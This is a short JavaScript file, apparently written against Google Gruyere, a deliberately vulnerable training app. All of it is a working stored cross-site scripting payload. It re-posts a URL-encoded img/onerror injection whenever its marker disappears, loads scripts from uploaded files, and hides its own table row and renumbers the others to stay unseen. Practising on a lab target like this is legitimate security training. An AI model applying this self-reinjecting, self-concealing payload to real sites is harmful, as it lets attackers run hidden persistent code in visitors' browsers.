//Some code I wrote while playing with google-gruyere:
function loadShit() {
    var r = new XMLHttpRequest();
    r.open('get', 'https://google-gruyere.appspot.com/473031374733925903961984636996275661103/newsnippet2?snippet=%3Cimg%20id%3D%27xssimg123%27%20src%20onerror%3D%22var%20s%3Ddocument.createElement(%27script%27)%3Bs.id%3D%27xss123%27%3Bs.setAttribute(%27src%27%2C%27https%3A%2F%2Fgoogle-gruyere.appspot.com%2F473031374733925903961984636996275661103%2Fboy.mc%40facto%2Fxss2.js%27)%3Bdocument.head.appendChild(s)%22%20%2F%3E');
    r.send();
}
function whichChild(elem) {
    var i = 0;
    while ((elem = elem.previousElementSibling) != null)
        ++i;
    return i;
}
var img = document.getElementById('xssimg123');
var tr = img.parentElement.parentElement.parentElement;
var tbody = tr.parentElement;
var imgIndex = whichChild(tr), allTrs = tbody.children.length;
tr.style.display = 'none';
for (var i = imgIndex + 1; i < allTrs; i++) {
    tbody.children[i].children[0].textContent = i - 1;
}

var r = new XMLHttpRequest();
r.addEventListener('load', function () {
    if (!/id='xssimg123'/.test(this.responseText))
        loadShit();
});
r.open('get', 'https://google-gruyere.appspot.com/473031374733925903961984636996275661103/snippets.gtl');
r.send();

var anywayScript = document.createElement('script');
anywayScript.setAttribute('src', 'https://google-gruyere.appspot.com/473031374733925903961984636996275661103/boy.mc@facto/anywayScript.js');
document.head.appendChild(anywayScript);
